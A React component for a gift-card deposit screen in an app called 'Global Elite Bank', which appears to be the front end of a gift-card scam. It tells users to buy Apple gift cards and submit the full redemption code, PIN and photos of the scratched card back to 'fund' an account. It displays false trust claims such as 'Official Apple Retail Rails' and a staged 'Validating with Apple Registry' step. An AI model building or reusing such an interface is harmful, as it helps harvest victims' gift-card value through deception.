import React, { useState } from 'react';
import { 
  X, Check, Copy, ExternalLink, ShieldCheck, ArrowRight,
  Upload, Image as ImageIcon, AlertCircle, Sparkles, CheckCircle2,
  Lock, RefreshCw, Eye, EyeOff, ShoppingBag, ArrowLeft, Download, Printer
} from 'lucide-react';
import { useBank } from '../store';

interface AppleGiftCardModalProps {
  isOpen: boolean;
  onClose: () => void;
  defaultTab?: 'buy' | 'redeem';
}

export function AppleGiftCardModal({ isOpen, onClose, defaultTab = 'redeem' }: AppleGiftCardModalProps) {
  const { currentUser, submitAppleGiftCard, adminSettings } = useBank();
  
  const [activeTab, setActiveTab] = useState<'buy' | 'redeem'>(defaultTab);
  const [amount, setAmount] = useState<number>(100);
  const [customAmount, setCustomAmount] = useState<string>('');
  const [currency, setCurrency] = useState<'USD' | 'EUR' | 'GBP' | 'CAD' | 'AUD'>('USD');
  const [region, setRegion] = useState('United States');
  const [cardType, setCardType] = useState<'digital' | 'physical'>('digital');
  const [cardCode, setCardCode] = useState('');
  const [showCode, setShowCode] = useState(false);
  const [pin, setPin] = useState('');
  const [targetAccountId, setTargetAccountId] = useState(currentUser?.accounts?.[0]?.id || '');
  const [receiptImage, setReceiptImage] = useState('');
  const [cardImage, setCardImage] = useState('');
  const [notes, setNotes] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittedReceipt, setSubmittedReceipt] = useState<any | null>(null);
  const [copiedLink, setCopiedLink] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  if (!isOpen) return null;

  const appleStoreUrl = adminSettings?.appleGiftCardSettings?.officialAppleStoreUrl || 'https://www.apple.com/shop/buy-giftcard/giftcard';
  const amazonUrl = adminSettings?.appleGiftCardSettings?.amazonBuyUrl || 'https://www.amazon.com/Apple-Gift-Card-email/dp/B08857ZSQ5';
  const payoutRate = adminSettings?.appleGiftCardSettings?.payoutRatePercentage || 100;
  
  const effectiveAmount = customAmount ? parseFloat(customAmount) || 0 : amount;
  const payoutAmount = +((effectiveAmount * payoutRate) / 100).toFixed(2);

  const primaryAccount = currentUser?.accounts?.find(a => a.id === targetAccountId) || currentUser?.accounts?.[0];

  const handleCardCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
    if (raw.length > 16) raw = raw.slice(0, 16);
    
    // Auto format: X-XXXX-XXXXXX-XXXX or grouped
    let formatted = raw;
    if (raw.length > 1) {
      formatted = raw.slice(0, 1) + '-' + raw.slice(1);
    }
    if (raw.length > 5) {
      formatted = raw.slice(0, 1) + '-' + raw.slice(1, 5) + '-' + raw.slice(5);
    }
    if (raw.length > 11) {
      formatted = raw.slice(0, 1) + '-' + raw.slice(1, 5) + '-' + raw.slice(5, 11) + '-' + raw.slice(11);
    }
    setCardCode(formatted);
    setErrorMsg('');
  };

  const handlePasteCode = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        let clean = text.toUpperCase().replace(/[^A-Z0-9]/g, '');
        if (clean.length > 16) clean = clean.slice(0, 16);
        let formatted = clean;
        if (clean.length > 1) formatted = clean.slice(0, 1) + '-' + clean.slice(1);
        if (clean.length > 5) formatted = clean.slice(0, 1) + '-' + clean.slice(1, 5) + '-' + clean.slice(5);
        if (clean.length > 11) formatted = clean.slice(0, 1) + '-' + clean.slice(1, 5) + '-' + clean.slice(5, 11) + '-' + clean.slice(11);
        setCardCode(formatted);
      }
    } catch (e) {
      console.warn('Clipboard read error:', e);
    }
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, type: 'receipt' | 'card') => {
    const file = e.target.files?.[0];
    if (file) {
      if (file.size > 5 * 1024 * 1024) {
        setErrorMsg('Image size exceeds 5MB limit. Please upload a smaller photo.');
        return;
      }
      const reader = new FileReader();
      reader.onload = (event) => {
        const base64 = event.target?.result as string;
        if (type === 'receipt') setReceiptImage(base64);
        else setCardImage(base64);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentUser) {
      setErrorMsg('Please log in to submit an Apple Gift Card deposit.');
      return;
    }
    const cleanRawCode = cardCode.replace(/[^A-Z0-9]/g, '');
    if (cleanRawCode.length < 10) {
      setErrorMsg('Please enter a valid 16-character Apple Gift Card redemption code.');
      return;
    }
    if (effectiveAmount < 10) {
      setErrorMsg('Minimum Apple Gift Card deposit is $10.00.');
      return;
    }
    if (!targetAccountId && !currentUser.accounts?.[0]?.id) {
      setErrorMsg('Please select a target bank account for crediting.');
      return;
    }

    setIsSubmitting(true);
    setErrorMsg('');

    setTimeout(() => {
      const res = submitAppleGiftCard({
        userId: currentUser.id,
        userName: currentUser.name,
        userEmail: currentUser.email,
        targetAccountId: targetAccountId || currentUser.accounts?.[0]?.id || '',
        targetAccountNumber: primaryAccount?.accountNumber || '',
        cardCode,
        pin: pin.trim() || undefined,
        amount: effectiveAmount,
        payoutAmount,
        currency,
        region,
        cardType,
        receiptImageUrl: receiptImage || undefined,
        cardImageUrl: cardImage || undefined,
        notes: notes.trim() || undefined
      });

      setIsSubmitting(false);
      if (res.success && res.card) {
        setSubmittedReceipt(res.card);
      }
    }, 800);
  };

  const handleCopyLink = (url: string) => {
    navigator.clipboard.writeText(url);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const presetAmounts = [25, 50, 100, 200, 500, 1000];

  return (
    <div 
      className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 md:p-6 bg-background/85 backdrop-blur-md overflow-y-auto"
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
    >
      <div className="bg-card border border-border w-full max-w-2xl rounded-3xl p-5 sm:p-7 shadow-2xl relative my-auto animate-in fade-in zoom-in-95 duration-200 max-h-[92vh] flex flex-col">
        
        {/* Header */}
        <div className="flex items-center justify-between border-b border-border/60 pb-4 shrink-0">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-neutral-900 to-neutral-700 text-white flex items-center justify-center border border-white/20 shadow-md">
              {/* Apple Logo SVG */}
              <svg className="w-6 h-6 fill-current" viewBox="0 0 170 170">
                <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.74 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.7-3.04-7.6-7.8-11.72-14.28-5.32-8.35-9.72-17.84-13.2-28.46-3.48-10.63-5.22-20.94-5.22-30.93 0-14.7 3.77-26.68 11.31-35.94 7.54-9.26 16.92-13.97 28.14-14.13 4.9.11 10.23 1.34 16 3.71 5.77 2.37 9.5 3.65 11.2 3.84 2.24-.31 6.13-1.68 11.66-4.11 5.53-2.43 10.5-3.56 14.92-3.4 12.38.74 21.96 5.16 28.74 13.26-10.96 6.64-16.32 15.69-16.08 27.15.24 8.97 3.69 16.48 10.36 22.53 6.67 6.05 14.61 9.4 23.82 10.05-2.01 6.18-4.46 12.28-7.38 18.3zM119.22 33.72c0-7.39 2.65-14.28 7.95-20.67 5.3-6.39 11.83-10.42 19.6-12.1 1.05 7.4-1.28 14.33-6.99 20.79-5.71 6.46-12.57 10.38-20.56 11.98z" />
              </svg>
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-lg sm:text-xl font-bold text-foreground">
                  Apple Gift Card Market & Deposit
                </h2>
                <span className="hidden sm:inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-500/10 text-emerald-500 border border-emerald-500/20">
                  <ShieldCheck size={12} /> Instant Clearing
                </span>
              </div>
              <p className="text-xs text-foreground/60">
                Buy an official Apple Gift Card online or redeem existing codes to instantly fund your account.
              </p>
            </div>
          </div>
          
          <button 
            type="button"
            onClick={onClose} 
            className="text-foreground/50 hover:text-foreground p-2 rounded-xl hover:bg-background border border-transparent hover:border-border transition-colors"
          >
            <X size={20} />
          </button>
        </div>

        {/* Navigation Tabs */}
        <div className="flex items-center gap-2 pt-4 pb-2 shrink-0">
          <button
            type="button"
            onClick={() => { setActiveTab('redeem'); setSubmittedReceipt(null); }}
            className={`flex-1 py-2.5 px-4 rounded-xl text-xs sm:text-sm font-bold transition-all flex items-center justify-center gap-2 ${
              activeTab === 'redeem'
                ? 'bg-primary text-white shadow-md'
                : 'bg-background text-foreground/70 border border-border hover:border-primary/40'
            }`}
          >
            <Sparkles size={16} />
            <span>Redeem / Sell Gift Card to Fund Account</span>
          </button>
          
          <button
            type="button"
            onClick={() => { setActiveTab('buy'); setSubmittedReceipt(null); }}
            className={`py-2.5 px-4 rounded-xl text-xs sm:text-sm font-bold transition-all flex items-center justify-center gap-2 ${
              activeTab === 'buy'
                ? 'bg-primary text-white shadow-md'
                : 'bg-background text-foreground/70 border border-border hover:border-primary/40'
            }`}
          >
            <ShoppingBag size={16} />
            <span>Buy Apple Gift Card</span>
          </button>
        </div>

        {/* Scrollable Content */}
        <div className="overflow-y-auto pr-1 py-2 flex-1 space-y-4">
          
          {/* TAB 1: BUY APPLE GIFT CARD */}
          {activeTab === 'buy' && (
            <div className="space-y-4 animate-in fade-in duration-200">
              <div className="bg-gradient-to-br from-neutral-900 via-neutral-800 to-neutral-900 text-white rounded-2xl p-6 border border-white/10 shadow-lg relative overflow-hidden">
                <div className="absolute right-0 top-0 bottom-0 w-1/3 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-white/10 to-transparent pointer-events-none" />
                
                <div className="relative z-10 max-w-lg">
                  <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-white/10 border border-white/20 text-white text-[11px] font-bold mb-3">
                    <ShieldCheck size={13} className="text-emerald-400" />
                    <span>Official Apple Retail Rails</span>
                  </div>
                  <h3 className="text-xl sm:text-2xl font-extrabold tracking-tight">
                    Buy Apple Gift Card Online
                  </h3>
                  <p className="text-xs sm:text-sm text-white/80 mt-2 leading-relaxed">
                    No crypto? You can easily fund your Global Elite Bank account with an Apple Gift Card. 
                    Purchase a digital e-gift card from Apple Market using your debit/credit card or PayPal, receive the 16-character redemption code instantly by email, and redeem it below.
                  </p>

                  <div className="mt-6 flex flex-wrap gap-3">
                    <a
                      href={appleStoreUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center gap-2 px-5 py-3 rounded-xl bg-white text-black font-extrabold text-xs sm:text-sm hover:bg-neutral-100 transition-all shadow-md active:scale-95"
                    >
                      <ShoppingBag size={16} />
                      <span>Redirect to Apple Market</span>
                      <ExternalLink size={14} className="opacity-70" />
                    </a>

                    <a
                      href={amazonUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center gap-2 px-4 py-3 rounded-xl bg-white/10 border border-white/20 text-white font-bold text-xs sm:text-sm hover:bg-white/20 transition-all active:scale-95"
                    >
                      <span>Buy on Amazon Store</span>
                      <ExternalLink size={14} className="opacity-70" />
                    </a>
                  </div>
                </div>
              </div>

              {/* Step by step guide */}
              <div className="bg-card border border-border rounded-2xl p-5 space-y-4">
                <h4 className="text-xs font-bold uppercase tracking-wider text-foreground/70">
                  How the 3-Step Apple Card Funding Rail Works:
                </h4>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                  <div className="bg-background border border-border rounded-xl p-3.5 space-y-2">
                    <div className="w-7 h-7 rounded-lg bg-primary/10 text-primary flex items-center justify-center font-bold text-xs">
                      1
                    </div>
                    <p className="text-xs font-bold text-foreground">Purchase on Apple Market</p>
                    <p className="text-[11px] text-foreground/60 leading-relaxed">
                      Click the button above to buy any denomination ($25 to $2,000) directly from Apple's official online store.
                    </p>
                  </div>

                  <div className="bg-background border border-border rounded-xl p-3.5 space-y-2">
                    <div className="w-7 h-7 rounded-lg bg-primary/10 text-primary flex items-center justify-center font-bold text-xs">
                      2
                    </div>
                    <p className="text-xs font-bold text-foreground">Get Digital Code via Email</p>
                    <p className="text-[11px] text-foreground/60 leading-relaxed">
                      Apple delivers the gift card with a unique 16-character redemption code straight to your personal email within minutes.
                    </p>
                  </div>

                  <div className="bg-background border border-border rounded-xl p-3.5 space-y-2">
                    <div className="w-7 h-7 rounded-lg bg-primary/10 text-primary flex items-center justify-center font-bold text-xs">
                      3
                    </div>
                    <p className="text-xs font-bold text-foreground">Redeem & Fund Balance</p>
                    <p className="text-[11px] text-foreground/60 leading-relaxed">
                      Switch to the "Redeem Gift Card" tab here, enter your 16-character code, and your bank account is immediately credited upon validation.
                    </p>
                  </div>
                </div>

                <div className="pt-2 flex justify-end">
                  <button
                    type="button"
                    onClick={() => setActiveTab('redeem')}
                    className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary text-white font-bold text-xs hover:bg-primary/90 transition-all"
                  >
                    <span>I already have a gift card code</span>
                    <ArrowRight size={14} />
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* TAB 2: REDEEM / SELL APPLE GIFT CARD */}
          {activeTab === 'redeem' && !submittedReceipt && (
            <form onSubmit={handleSubmit} className="space-y-4 animate-in fade-in duration-200">
              
              {/* Apple Store Quick Banner */}
              <div className="bg-background border border-border rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-lg bg-foreground/5 flex items-center justify-center text-foreground font-bold shrink-0">
                    
                  </div>
                  <div>
                    <p className="font-bold text-foreground">Need to buy an Apple Gift Card first?</p>
                    <p className="text-foreground/50 text-[11px]">Purchase officially with debit card, credit card, or PayPal.</p>
                  </div>
                </div>
                <a
                  href={appleStoreUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="px-3.5 py-1.5 rounded-lg bg-card border border-border text-foreground hover:bg-foreground/5 font-bold flex items-center justify-center gap-1.5 shrink-0 transition-colors"
                >
                  <span>Redirect to Apple Market</span>
                  <ExternalLink size={12} />
                </a>
              </div>

              {errorMsg && (
                <div className="p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-500 text-xs font-bold flex items-center gap-2">
                  <AlertCircle size={16} className="shrink-0" />
                  <span>{errorMsg}</span>
                </div>
              )}

              {/* Amount Selection */}
              <div className="bg-card border border-border rounded-2xl p-4 sm:p-5 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold uppercase tracking-wider text-foreground/70">
                    1. Card Face Value & Currency
                  </label>
                  <span className="text-[11px] font-bold text-emerald-500">
                    {payoutRate}% Account Credit Payout
                  </span>
                </div>

                <div className="grid grid-cols-3 sm:grid-cols-6 gap-2">
                  {presetAmounts.map((amt) => (
                    <button
                      key={amt}
                      type="button"
                      onClick={() => { setAmount(amt); setCustomAmount(''); }}
                      className={`py-2 px-3 rounded-xl text-xs font-bold transition-all border ${
                        amount === amt && !customAmount
                          ? 'bg-primary text-white border-primary shadow-xs'
                          : 'bg-background text-foreground border-border hover:border-primary/40'
                      }`}
                    >
                      ${amt}
                    </button>
                  ))}
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
                  <div>
                    <label className="block text-[11px] font-bold text-foreground/60 mb-1">
                      Or Custom Face Value ($)
                    </label>
                    <input
                      type="number"
                      min="10"
                      step="1"
                      placeholder="e.g. 150"
                      value={customAmount}
                      onChange={(e) => setCustomAmount(e.target.value)}
                      className="w-full bg-background border border-border rounded-xl px-3 py-2 text-xs font-bold text-foreground focus:border-primary outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-[11px] font-bold text-foreground/60 mb-1">
                      Card Currency & Region
                    </label>
                    <select
                      value={currency}
                      onChange={(e) => setCurrency(e.target.value as any)}
                      className="w-full bg-background border border-border rounded-xl px-3 py-2 text-xs font-bold text-foreground focus:border-primary outline-none"
                    >
                      <option value="USD">USD ($) - United States</option>
                      <option value="EUR">EUR (€) - Europe / EU</option>
                      <option value="GBP">GBP (£) - United Kingdom</option>
                      <option value="CAD">CAD ($) - Canada</option>
                      <option value="AUD">AUD ($) - Australia</option>
                    </select>
                  </div>
                </div>

                {/* Calculation summary */}
                <div className="bg-background/80 border border-border rounded-xl p-3 flex items-center justify-between text-xs">
                  <span className="text-foreground/60 font-semibold">Credited to Your Balance:</span>
                  <span className="font-mono font-extrabold text-sm text-emerald-500">
                    ${payoutAmount.toLocaleString()} USD
                  </span>
                </div>
              </div>

              {/* 16-Character Apple Code & Target Account */}
              <div className="bg-card border border-border rounded-2xl p-4 sm:p-5 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold uppercase tracking-wider text-foreground/70">
                    2. Apple Gift Card Code (16-Digit)
                  </label>
                  <button
                    type="button"
                    onClick={handlePasteCode}
                    className="text-[11px] font-bold text-primary hover:underline flex items-center gap-1"
                  >
                    <span>Paste Code</span>
                  </button>
                </div>

                <div className="relative">
                  <input
                    type={showCode ? 'text' : 'password'}
                    placeholder="X-XXXX-XXXXXX-XXXX"
                    value={cardCode}
                    onChange={handleCardCodeChange}
                    className="w-full bg-background border border-border rounded-xl px-4 py-3 text-sm font-mono font-bold tracking-widest text-foreground focus:border-primary outline-none pr-24 uppercase"
                    maxLength={19}
                  />
                  <div className="absolute right-2.5 top-1/2 -translate-y-1/2 flex items-center gap-1">
                    <button
                      type="button"
                      onClick={() => setShowCode(!showCode)}
                      className="p-1.5 text-foreground/50 hover:text-foreground rounded-lg transition-colors"
                      title={showCode ? 'Hide Code' : 'Show Code'}
                    >
                      {showCode ? <EyeOff size={16} /> : <Eye size={16} />}
                    </button>
                  </div>
                </div>
                <p className="text-[11px] text-foreground/50 leading-relaxed">
                  Look for the 16-character code starting with 'X' on your gift card email or scratch-off back panel.
                </p>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-2">
                  <div>
                    <label className="block text-[11px] font-bold text-foreground/60 mb-1">
                      Optional PIN / Security Code
                    </label>
                    <input
                      type="text"
                      placeholder="e.g. 4-8 digits (if present)"
                      value={pin}
                      onChange={(e) => setPin(e.target.value)}
                      className="w-full bg-background border border-border rounded-xl px-3 py-2 text-xs font-mono font-bold text-foreground focus:border-primary outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-[11px] font-bold text-foreground/60 mb-1">
                      Target Bank Account
                    </label>
                    <select
                      value={targetAccountId}
                      onChange={(e) => setTargetAccountId(e.target.value)}
                      className="w-full bg-background border border-border rounded-xl px-3 py-2 text-xs font-bold text-foreground focus:border-primary outline-none"
                    >
                      {currentUser?.accounts?.map((acc) => (
                        <option key={acc.id} value={acc.id}>
                          {acc.type} - #{acc.accountNumber} (${acc.balance.toLocaleString()})
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
              </div>

              {/* Upload Receipt or Photo */}
              <div className="bg-card border border-border rounded-2xl p-4 sm:p-5 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold uppercase tracking-wider text-foreground/70">
                    3. Proof / Receipt Photo (Optional for Faster Clearance)
                  </label>
                  <span className="text-[10px] text-foreground/50">PNG, JPG under 5MB</span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div className="border border-dashed border-border rounded-xl p-3 bg-background/50 flex flex-col items-center justify-center text-center">
                    {receiptImage ? (
                      <div className="relative group w-full flex flex-col items-center">
                        <img 
                          src={receiptImage} 
                          alt="Receipt Preview" 
                          className="h-20 object-contain rounded-lg shadow-xs" 
                        />
                        <button
                          type="button"
                          onClick={() => setReceiptImage('')}
                          className="mt-1 text-[10px] text-rose-500 font-bold hover:underline"
                        >
                          Remove Photo
                        </button>
                      </div>
                    ) : (
                      <label className="cursor-pointer flex flex-col items-center py-2 w-full">
                        <Upload size={18} className="text-foreground/40 mb-1" />
                        <span className="text-xs font-bold text-primary">Upload Store Receipt</span>
                        <span className="text-[10px] text-foreground/40 mt-0.5">Apple Store, Amazon, or store slip</span>
                        <input
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleFileUpload(e, 'receipt')}
                          className="hidden"
                        />
                      </label>
                    )}
                  </div>

                  <div className="border border-dashed border-border rounded-xl p-3 bg-background/50 flex flex-col items-center justify-center text-center">
                    {cardImage ? (
                      <div className="relative group w-full flex flex-col items-center">
                        <img 
                          src={cardImage} 
                          alt="Card Preview" 
                          className="h-20 object-contain rounded-lg shadow-xs" 
                        />
                        <button
                          type="button"
                          onClick={() => setCardImage('')}
                          className="mt-1 text-[10px] text-rose-500 font-bold hover:underline"
                        >
                          Remove Photo
                        </button>
                      </div>
                    ) : (
                      <label className="cursor-pointer flex flex-col items-center py-2 w-full">
                        <ImageIcon size={18} className="text-foreground/40 mb-1" />
                        <span className="text-xs font-bold text-primary">Upload Card Back Photo</span>
                        <span className="text-[10px] text-foreground/40 mt-0.5">Showing scratched code (physical cards)</span>
                        <input
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleFileUpload(e, 'card')}
                          className="hidden"
                        />
                      </label>
                    )}
                  </div>
                </div>
              </div>

              {/* Submit CTA */}
              <div className="pt-2">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3.5 rounded-xl bg-primary text-white font-extrabold text-sm hover:bg-primary/90 transition-all flex items-center justify-center gap-2 shadow-lg shadow-primary/20 disabled:opacity-50 cursor-pointer active:scale-98"
                >
                  {isSubmitting ? (
                    <>
                      <RefreshCw size={18} className="animate-spin" />
                      <span>Validating with Apple Registry...</span>
                    </>
                  ) : (
                    <>
                      <ShieldCheck size={18} />
                      <span>Redeem & Credit ${payoutAmount.toLocaleString()} to Account</span>
                    </>
                  )}
                </button>
                <p className="text-center text-[10px] text-foreground/50 mt-2">
                  🔒 Encrypted submission. An automated deposit receipt & email confirmation will be sent to your inbox.
                </p>
              </div>

            </form>
          )}

          {/* SUCCESS RECEIPT VIEW */}
          {submittedReceipt && (
            <div className="space-y-4 animate-in fade-in zoom-in-95 duration-200">
              <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-2xl p-5 text-center space-y-3">
                <div className="w-12 h-12 rounded-full bg-emerald-500 text-white flex items-center justify-center mx-auto shadow-md">
                  <CheckCircle2 size={26} />
                </div>
                <div>
                  <h3 className="text-lg font-bold text-foreground">
                    Apple Gift Card Submitted Successfully!
                  </h3>
                  <p className="text-xs text-foreground/70 mt-1 max-w-md mx-auto">
                    Your redemption code has been received and queued for verification with the official Apple Store registry.
                  </p>
                </div>
              </div>

              {/* Receipt Ticket */}
              <div className="bg-card border border-border rounded-2xl p-5 space-y-3 text-xs">
                <div className="flex items-center justify-between border-b border-border pb-2.5">
                  <span className="text-foreground/50 uppercase font-bold text-[10px]">Reference Number</span>
                  <span className="font-mono font-bold text-primary">{submittedReceipt.receiptNumber}</span>
                </div>

                <div className="flex items-center justify-between border-b border-border pb-2.5">
                  <span className="text-foreground/50 uppercase font-bold text-[10px]">Card Value</span>
                  <span className="font-bold text-foreground font-mono">${submittedReceipt.amount.toLocaleString()} {submittedReceipt.currency}</span>
                </div>

                <div className="flex items-center justify-between border-b border-border pb-2.5">
                  <span className="text-foreground/50 uppercase font-bold text-[10px]">Credited Payout Amount</span>
                  <span className="font-extrabold text-emerald-500 font-mono text-sm">${submittedReceipt.payoutAmount.toLocaleString()} USD</span>
                </div>

                <div className="flex items-center justify-between border-b border-border pb-2.5">
                  <span className="text-foreground/50 uppercase font-bold text-[10px]">Redemption Code</span>
                  <span className="font-mono font-bold text-foreground">{submittedReceipt.cardCode.replace(/.(?=.{4})/g, '*')}</span>
                </div>

                <div className="flex items-center justify-between border-b border-border pb-2.5">
                  <span className="text-foreground/50 uppercase font-bold text-[10px]">Beneficiary Account</span>
                  <span className="font-mono font-bold text-foreground">#{submittedReceipt.targetAccountNumber || 'Primary'}</span>
                </div>

                <div className="flex items-center justify-between pt-1">
                  <span className="text-foreground/50 uppercase font-bold text-[10px]">Status</span>
                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-amber-500/10 text-amber-500 border border-amber-500/20">
                    Pending Clearing Verification
                  </span>
                </div>
              </div>

              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setSubmittedReceipt(null);
                    setCardCode('');
                    setReceiptImage('');
                    setCardImage('');
                  }}
                  className="flex-1 py-3 rounded-xl bg-card border border-border text-foreground font-bold text-xs hover:bg-background transition-colors flex items-center justify-center gap-1.5"
                >
                  <ArrowLeft size={14} />
                  <span>Submit Another Card</span>
                </button>

                <button
                  type="button"
                  onClick={onClose}
                  className="flex-1 py-3 rounded-xl bg-primary text-white font-bold text-xs hover:bg-primary/90 transition-colors flex items-center justify-center gap-1.5"
                >
                  <span>Done / Close</span>
                </button>
              </div>
            </div>
          )}

        </div>

      </div>
    </div>
  );
}
